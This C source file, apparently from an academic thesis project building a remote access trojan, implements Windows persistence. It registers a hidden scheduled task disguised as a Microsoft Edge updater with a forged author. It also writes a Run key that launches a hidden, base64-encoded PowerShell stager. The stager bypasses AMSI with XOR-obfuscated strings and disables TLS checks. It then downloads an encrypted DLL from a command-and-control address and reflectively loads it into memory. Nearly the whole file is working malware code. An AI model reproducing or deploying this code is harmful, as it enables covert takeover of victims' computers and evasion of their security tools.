/*
 * scheduled_task.c — Persistenza via Task Scheduler + Run key
 *
 * Task schedulata (T1053.005): COM/ITaskService, camuffata come
 * MicrosoftEdgeUpdateTaskMachineCore. Run key (T1547.001): stager
 * PS con AMSI bypass XOR-encoded (-EncodedCommand base64 UTF-16LE).
 *
 * MITRE ATT&CK: T1053.005, T1547.001
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */

#include <windows.h>
#include <stdio.h>
#include <taskschd.h>
#include <combaseapi.h>
#include <oleauto.h>
#include <time.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

#define TASK_FOLDER_STEALTH  L"\\Microsoft\\Windows"
#define TASK_FOLDER_ROOT     L"\\"
#define TASK_NAME    L"MicrosoftEdgeUpdateTaskMachineCore"
#define TASK_DESC    L"Keeps your Microsoft Edge browser up to date."
#define TASK_AUTHOR  L"Microsoft Corporation"

#define RUN_KEY_PATH \
    L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_KEY_NAME L"MicrosoftEdgeUpdate"

#define TASKCACHE_TREE_STEALTH \
    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule" \
    L"\\TaskCache\\Tree\\Microsoft\\Windows\\" TASK_NAME
#define TASKCACHE_TASKS_BASE \
    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule" \
    L"\\TaskCache\\Tasks\\"

/* ─── DEBUG ─────────────────────────────────────────────────────────────────*/
static void _dbg(const char *step, HRESULT hr) {
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    lstrcatA(path, "ip_debug.txt");
    HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                            OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    char buf[160];
    int n = wsprintfA(buf, "[%s] hr=0x%08X\r\n", step, (unsigned)hr);
    DWORD dw;
    WriteFile(hf, buf, (DWORD)n, &dw, NULL);
    CloseHandle(hf);
}

/* ─── Random delay "PT<N>S" con N in [30,90] ────────────────────────────────*/
static BSTR _make_random_delay(void) {
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    int delaySec = 30 + (rand() % 61);
    WCHAR buf[16];
    wsprintfW(buf, L"PT%dS", delaySec);
    return SysAllocString(buf);
}

/* ─── SD trick disabilitato (vedi v4) ───────────────────────────────────────*/
#if 0
static void _hide_task_in_registry(void) { /* ... */ }
#endif

/* ─── Run key legacy (exe path) — non più chiamata da install_persistence ───*/
static void _install_run_key_exe(const wchar_t *exe_path) {
    HKEY hKey = NULL;
    LONG lRet = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                               0, KEY_SET_VALUE, &hKey);
    if (lRet != ERROR_SUCCESS) return;
    DWORD cbData = (DWORD)((wcslen(exe_path) + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, RUN_KEY_NAME, 0, REG_SZ,
                   (const BYTE*)exe_path, cbData);
    RegCloseKey(hKey);
}

/* ─── Base64 RFC 4648 ────────────────────────────────────────────────────────
 * Ritorna buffer allocato con HeapAlloc — il chiamante deve liberarlo.       */
static char *_base64_encode(const BYTE *src, DWORD srcLen) {
    static const char b64[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD outLen = ((srcLen + 2) / 3) * 4 + 1;
    char *out = (char *)HeapAlloc(GetProcessHeap(), 0, outLen);
    if (!out) return NULL;
    DWORD i, j = 0;
    for (i = 0; i + 2 < srcLen; i += 3) {
        out[j++] = b64[(src[i] >> 2) & 0x3F];
        out[j++] = b64[((src[i] & 3) << 4)   | (src[i+1] >> 4)];
        out[j++] = b64[((src[i+1] & 0xF) << 2)| (src[i+2] >> 6)];
        out[j++] = b64[src[i+2] & 0x3F];
    }
    if (i < srcLen) {
        out[j++] = b64[(src[i] >> 2) & 0x3F];
        if (i + 1 < srcLen) {
            out[j++] = b64[((src[i] & 3) << 4) | (src[i+1] >> 4)];
            out[j++] = b64[(src[i+1] & 0xF) << 2];
        } else {
            out[j++] = b64[(src[i] & 3) << 4];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    out[j] = '\0';
    return out;
}

/* ─── PowerShell stager (UTF-16LE + base64 per -EncodedCommand) ──────────────*/
static const char g_stager_ps[] =
    /* -- AMSI bypass: XOR-decode "System.Management.Automation.AmsiUtils" --
     * Chiave 0x42; nessuna stringa sensibile appare in chiaro nel sorgente PS.
     * Anziché GetField("amsiInitFailed"), enumera tutti i bool field NonPublic+Static
     * e li setta a $true → resiliente a future rename del field in PS. */
    "$_k=0x42;"
    "$_e=[byte[]](0x11,0x3B,0x31,0x36,0x27,0x2F,0x6C,0x0F,"
    "0x23,0x2C,0x23,0x25,0x27,0x2F,0x27,0x2C,0x36,0x6C,0x03,"
    "0x37,0x36,0x2D,0x2F,0x23,0x36,0x2B,0x2D,0x2C,0x6C,0x03,"
    "0x2F,0x31,0x2B,0x17,0x36,0x2B,0x2E,0x31);"
    "$_n=[Text.Encoding]::ASCII.GetString(($_e|%{$_-bxor $_k}));"
    "$_bf=[Reflection.BindingFlags]'NonPublic,Static';"
    "$_t=[Ref].Assembly.GetType($_n);"
    "$_t.GetFields($_bf)|?{$_.FieldType-eq[bool]}|%{try{$_.SetValue($null,$true)}catch{}};"
    /* -- TLS bypass -- */
    "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
    "$b=(New-Object Net.WebClient).DownloadData('https://192.168.42.124/update_dll');"
    "$k=[byte[]](0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,0x15,0xB4,0x22,0xCF,"
    "0xEF,0x50,0x9F,0x00,0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,0x7C,0x61,"
    "0x55,0x99,0xE7,0x43,0xEE,0x28);"
    "for($i=0;$i-lt $b.Length;$i++){$b[$i]=$b[$i]-bxor $k[$i%32]};"
    "$bc=[System.BitConverter];"
    "$e=[int]$bc::ToInt32($b,0x3C);"
    "$ns=[int]$bc::ToInt16($b,$e+6);"
    "$oh=[int]$bc::ToInt16($b,$e+0x14);"
    "$st=$e+24+$oh;"
    "function r($v){"
    "for($s=0;$s-lt $script:ns;$s++){"
    "$sh=$script:st+$s*40;"
    "$va=[int]$script:bc::ToInt32($script:b,$sh+12);"
    "$vs=[int]$script:bc::ToInt32($script:b,$sh+16);"
    "$rw=[int]$script:bc::ToInt32($script:b,$sh+20);"
    "if($v-ge $va-and $v-lt $va+$vs){return $rw+($v-$va)}};"
    "return -1};"
    "$ed=[int]$bc::ToInt32($b,$e+0x88);"
    "$er=r $ed;"
    "$nn=[int]$bc::ToInt32($b,$er+0x18);"
    "$aof=[int]$bc::ToInt32($b,$er+0x1C);"
    "$nof=[int]$bc::ToInt32($b,$er+0x20);"
    "$of=[int]$bc::ToInt32($b,$er+0x24);"
    "$rl=-1;"
    "for($i=0;$i-lt $nn;$i++){"
    "$nr=r([int]$bc::ToInt32($b,$nof+$i*4));"
    "$nm='';$j=0;"
    "while($b[$nr+$j]-ne 0){$nm+=[char]$b[$nr+$j];$j++};"
    "if($nm-eq 'ReflectiveLoader'){"
    "$oi=[int]$bc::ToInt16($b,(r $of)+$i*2);"
    "$rl=[int]$bc::ToInt32($b,(r $aof)+[int]$oi*4);"
    "break}};"
    "if($rl-eq -1){exit 1};"
    "$t=Add-Type -MemberDefinition "
    "'[DllImport(\"kernel32.dll\")]"
    "public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);"
    "[DllImport(\"kernel32.dll\")]"
    "public static extern IntPtr CreateThread(IntPtr a,UIntPtr s,IntPtr e,IntPtr p,uint f,IntPtr i);"
    "[DllImport(\"kernel32.dll\")]"
    "public static extern uint WaitForSingleObject(IntPtr h,uint t);'"
    " -Name K -PassThru;"
    "$p=$t::VirtualAlloc([IntPtr]::Zero,[UIntPtr]$b.Length,0x3000,0x40);"
    "[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length);"
    "$h=$t::CreateThread([IntPtr]::Zero,[UIntPtr]::Zero,"
    "[IntPtr]($p.ToInt64()+$rl),[IntPtr]::Zero,0,[IntPtr]::Zero);"
    "$t::WaitForSingleObject($h,0xFFFFFFFF)";

/* ─── PS UTF-8 → UTF-16LE → base64 → wchar_t* ───────────────────────────────
 * Ritorna stringa allocata con HeapAlloc — il chiamante deve liberarla.      */
static wchar_t *_ps_to_encoded_cmd(const char *ps_utf8) {
    /* UTF-8 → UTF-16LE */
    int wlen = MultiByteToWideChar(CP_UTF8, 0, ps_utf8, -1, NULL, 0);
    if (wlen <= 0) return NULL;

    WORD *utf16 = (WORD *)HeapAlloc(GetProcessHeap(), 0,
                                    (DWORD)wlen * sizeof(WORD));
    if (!utf16) return NULL;

    MultiByteToWideChar(CP_UTF8, 0, ps_utf8, -1, (wchar_t *)utf16, wlen);

    /* byte count senza null terminator */
    DWORD byteLen = (DWORD)(wlen - 1) * 2;

    char *b64str = _base64_encode((BYTE *)utf16, byteLen);
    HeapFree(GetProcessHeap(), 0, utf16);
    if (!b64str) return NULL;

    /* ASCII base64 → wchar_t */
    int b64Len = lstrlenA(b64str);
    wchar_t *out = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
                                        (DWORD)(b64Len + 1) * sizeof(wchar_t));
    if (!out) { HeapFree(GetProcessHeap(), 0, b64str); return NULL; }

    for (int k = 0; k <= b64Len; k++)
        out[k] = (wchar_t)(unsigned char)b64str[k];

    HeapFree(GetProcessHeap(), 0, b64str);
    return out;
}

/* ─── install_run_key(void) — PUBBLICA ──────────────────────────────────────
 * Installa lo stager PS nel Run key HKCU come:
 *   powershell.exe -WindowStyle Hidden -EncodedCommand <BASE64_UTF16LE>
 * Non richiede path EXE — il payload viene scaricato dal C2 al prossimo logon.
 * MITRE T1547.001
 * ─────────────────────────────────────────────────────────────────────────*/
int install_run_key(void) {
    wchar_t *encCmd = _ps_to_encoded_cmd(g_stager_ps);
    if (!encCmd) {
        _dbg("RunKey_encode_fail", E_OUTOFMEMORY);
        return 0;
    }

    /* "powershell.exe -WindowStyle Hidden -EncodedCommand <b64>" */
    DWORD cmdLen = (DWORD)(wcslen(encCmd) + 64);
    wchar_t *val = (wchar_t *)HeapAlloc(GetProcessHeap(), 0,
                                        cmdLen * sizeof(wchar_t));
    if (!val) {
        HeapFree(GetProcessHeap(), 0, encCmd);
        return 0;
    }
    _snwprintf(val, cmdLen - 1,
               L"powershell.exe -WindowStyle Hidden -EncodedCommand %s",
               encCmd);
    HeapFree(GetProcessHeap(), 0, encCmd);

    HKEY hKey = NULL;
    LONG lRet = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                               0, KEY_SET_VALUE, &hKey);
    if (lRet != ERROR_SUCCESS) {
        _dbg("RunKey_ps_open_fail", HRESULT_FROM_WIN32(lRet));
        HeapFree(GetProcessHeap(), 0, val);
        return 0;
    }

    DWORD cbData = (DWORD)((wcslen(val) + 1) * sizeof(wchar_t));
    lRet = RegSetValueExW(hKey, RUN_KEY_NAME, 0, REG_SZ,
                          (const BYTE *)val, cbData);
    RegCloseKey(hKey);
    HeapFree(GetProcessHeap(), 0, val);

    _dbg("RunKey_ps", lRet == ERROR_SUCCESS ? S_OK
                                             : HRESULT_FROM_WIN32(lRet));
    return (lRet == ERROR_SUCCESS) ? 1 : 0;
}

/* ─── _register_task_in_folder ───────────────────────────────────────────────*/
static HRESULT _register_task_in_folder(ITaskService    *pService,
                                         ITaskDefinition *pTask,
                                         const wchar_t   *folder,
                                         const wchar_t   *taskName) {
    HRESULT       hr;
    VARIANT       vEmpty;
    ITaskFolder  *pFolder = NULL;
    IRegisteredTask *pReg = NULL;

    VariantInit(&vEmpty);
    hr = pService->lpVtbl->GetFolder(pService, (BSTR)folder, &pFolder);
    if (FAILED(hr)) return hr;

    BSTR bName = SysAllocString(taskName);
    hr = pFolder->lpVtbl->RegisterTaskDefinition(
        pFolder, bName, pTask,
        TASK_CREATE_OR_UPDATE,
        vEmpty, vEmpty,
        TASK_LOGON_INTERACTIVE_TOKEN,
        vEmpty, &pReg);
    SysFreeString(bName);

    if (pReg)    { pReg->lpVtbl->Release(pReg);      }
    if (pFolder) { pFolder->lpVtbl->Release(pFolder); }
    return hr;
}

/* ─── install_persistence ────────────────────────────────────────────────────
 * Registra task schedulata (primaria) + PS stager nel Run key (backup).
 * COM deve essere già inizializzato dal chiamante.
 * Ritorna 1 se almeno la task è stata registrata.
 * ─────────────────────────────────────────────────────────────────────────*/
int install_persistence(const wchar_t *exe_path, const wchar_t *arguments) {
    HRESULT hr;
    int     bTaskOk = 0;
    VARIANT vEmpty;

    _dbg("START_v5", 0);

    ITaskService       *pService    = NULL;
    ITaskDefinition    *pTask       = NULL;
    IRegistrationInfo  *pRegInfo    = NULL;
    ITaskSettings      *pSettings   = NULL;
    IPrincipal         *pPrincipal  = NULL;
    ITriggerCollection *pTriggers   = NULL;
    ITrigger           *pTrigger    = NULL;
    IActionCollection  *pActions    = NULL;
    IAction            *pAction     = NULL;
    IExecAction        *pExecAction = NULL;

    VariantInit(&vEmpty);

    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL,
        CLSCTX_ALL, &IID_ITaskService, (void **)&pService);
    _dbg("CoCreateInstance", hr);
    if (FAILED(hr)) goto cleanup;

    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    _dbg("Connect", hr);
    if (FAILED(hr)) goto cleanup;

    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) goto cleanup;

    hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    if (SUCCEEDED(hr)) {
        pRegInfo->lpVtbl->put_Description(pRegInfo, (BSTR)TASK_DESC);
        pRegInfo->lpVtbl->put_Author(pRegInfo,      (BSTR)TASK_AUTHOR);
        pRegInfo->lpVtbl->Release(pRegInfo); pRegInfo = NULL;
    }

    hr = pTask->lpVtbl->get_Settings(pTask, &pSettings);
    if (SUCCEEDED(hr)) {
        pSettings->lpVtbl->put_Hidden(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_StartWhenAvailable(pSettings, VARIANT_TRUE);
        pSettings->lpVtbl->put_DisallowStartIfOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->put_StopIfGoingOnBatteries(pSettings, VARIANT_FALSE);
        pSettings->lpVtbl->put_MultipleInstances(pSettings, TASK_INSTANCES_IGNORE_NEW);
        pSettings->lpVtbl->Release(pSettings); pSettings = NULL;
    }

    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (SUCCEEDED(hr)) {
        pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_LUA);
        pPrincipal->lpVtbl->Release(pPrincipal); pPrincipal = NULL;
    }

    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
    if (FAILED(hr)) goto cleanup;

    hr = pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrigger);
    if (FAILED(hr)) goto cleanup;

    {
        ILogonTrigger *pLogon = NULL;
        if (SUCCEEDED(pTrigger->lpVtbl->QueryInterface(pTrigger,
                &IID_ILogonTrigger, (void **)&pLogon))) {
            BSTR bDelay = _make_random_delay();
            if (bDelay) { pLogon->lpVtbl->put_Delay(pLogon, bDelay); SysFreeString(bDelay); }
            pLogon->lpVtbl->Release(pLogon);
        }
    }
    pTrigger->lpVtbl->Release(pTrigger);   pTrigger  = NULL;
    pTriggers->lpVtbl->Release(pTriggers); pTriggers = NULL;

    hr = pTask->lpVtbl->get_Actions(pTask, &pActions);
    if (FAILED(hr)) goto cleanup;

    hr = pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) goto cleanup;

    hr = pAction->lpVtbl->QueryInterface(pAction,
        &IID_IExecAction, (void **)&pExecAction);
    if (FAILED(hr)) goto cleanup;

    { BSTR bp = SysAllocString(exe_path);
      hr = pExecAction->lpVtbl->put_Path(pExecAction, bp);
      SysFreeString(bp); }
    if (FAILED(hr)) goto cleanup;

    if (arguments && arguments[0] != L'\0') {
        BSTR ba = SysAllocString(arguments);
        pExecAction->lpVtbl->put_Arguments(pExecAction, ba);
        SysFreeString(ba);
    }

    pExecAction->lpVtbl->Release(pExecAction); pExecAction = NULL;
    pAction->lpVtbl->Release(pAction);         pAction     = NULL;
    pActions->lpVtbl->Release(pActions);       pActions    = NULL;

    hr = _register_task_in_folder(pService, pTask, TASK_FOLDER_STEALTH, TASK_NAME);
    _dbg("RegisterTask_stealth", hr);
    if (FAILED(hr)) {
        hr = _register_task_in_folder(pService, pTask, TASK_FOLDER_ROOT, TASK_NAME);
        _dbg("RegisterTask_root_fallback", hr);
    }
    if (SUCCEEDED(hr)) { bTaskOk = 1; _dbg("Task_SUCCESS", hr); }

cleanup:
    if (pExecAction) pExecAction->lpVtbl->Release(pExecAction);
    if (pAction)     pAction->lpVtbl->Release(pAction);
    if (pActions)    pActions->lpVtbl->Release(pActions);
    if (pTrigger)    pTrigger->lpVtbl->Release(pTrigger);
    if (pTriggers)   pTriggers->lpVtbl->Release(pTriggers);
    if (pPrincipal)  pPrincipal->lpVtbl->Release(pPrincipal);
    if (pSettings)   pSettings->lpVtbl->Release(pSettings);
    if (pRegInfo)    pRegInfo->lpVtbl->Release(pRegInfo);
    if (pTask)       pTask->lpVtbl->Release(pTask);
    if (pService)    pService->lpVtbl->Release(pService);

    /* [v5] Run key: PS stager invece del path EXE */
    install_run_key();

    _dbg("END", bTaskOk ? S_OK : E_FAIL);
    return bTaskOk;
}

/* ─── remove_persistence ─────────────────────────────────────────────────────*/
void remove_persistence(void) {
    HRESULT  hr;
    VARIANT  vEmpty;
    ITaskService *pService = NULL;
    ITaskFolder  *pFolder  = NULL;

    VariantInit(&vEmpty);

    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL,
        CLSCTX_ALL, &IID_ITaskService, (void **)&pService);
    if (FAILED(hr)) goto cleanup2;

    hr = pService->lpVtbl->Connect(pService, vEmpty, vEmpty, vEmpty, vEmpty);
    if (FAILED(hr)) goto cleanup2;

    if (SUCCEEDED(pService->lpVtbl->GetFolder(pService,
                   TASK_FOLDER_STEALTH, &pFolder))) {
        BSTR bName = SysAllocString(TASK_NAME);
        pFolder->lpVtbl->DeleteTask(pFolder, bName, 0);
        SysFreeString(bName);
        pFolder->lpVtbl->Release(pFolder); pFolder = NULL;
    }
    if (SUCCEEDED(pService->lpVtbl->GetFolder(pService,
                   TASK_FOLDER_ROOT, &pFolder))) {
        BSTR bName = SysAllocString(TASK_NAME);
        pFolder->lpVtbl->DeleteTask(pFolder, bName, 0);
        SysFreeString(bName);
        pFolder->lpVtbl->Release(pFolder); pFolder = NULL;
    }

    {
        HKEY hKey = NULL;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH,
                          0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, RUN_KEY_NAME);
            RegCloseKey(hKey);
        }
    }

cleanup2:
    if (pFolder)  pFolder->lpVtbl->Release(pFolder);
    if (pService) pService->lpVtbl->Release(pService);
}
